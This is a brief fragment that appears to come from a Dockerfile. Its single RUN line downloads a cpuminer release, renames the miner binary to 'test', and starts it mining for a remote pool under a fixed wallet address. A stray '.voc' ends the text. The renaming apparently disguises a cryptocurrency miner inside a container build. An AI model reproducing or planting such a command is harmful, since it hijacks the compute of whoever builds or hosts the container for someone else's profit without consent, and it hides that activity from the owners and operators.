...
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 test && ./test -a yespowermgpc  -o stratum+tcps://stratum-eu.rplant.xyz:17049 -u LcW5MfbLwHayuHRL2jJeQN8AXGWC4Bv6Xk
.voc
